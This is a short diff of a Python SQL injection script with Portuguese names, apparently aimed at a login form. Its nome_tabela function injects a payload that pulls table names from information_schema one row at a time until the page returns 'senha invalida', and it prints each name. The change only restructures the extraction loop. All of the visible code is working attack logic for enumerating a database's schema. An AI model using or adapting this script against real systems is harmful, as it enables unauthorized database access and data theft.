@@ -36,13 +36,13 @@ def nome_tabela():
 information_schema.tables where table_schema in (SELECT DATABASE()) limit {},1 #'
 
     ct = 3
-    tmp = ''
+    tmp = resultado_total(payload.format(ct))
 
-    while 'senha invalida' not in tmp:
-        tmp = resultado_total(payload.format(ct))
-        tabelas[tmp] = {}   # o indice 1 é para tirar um caracter special
+    while 'senha invalida' not in tmp: 
+        tabelas[tmp] = {}   
         print('\033[93m','Nome de tabela: ', tmp,'\033[0m')
         ct += 1 
+        tmp = resultado_total(payload.format(ct))
         
 
 def nome_coluna():
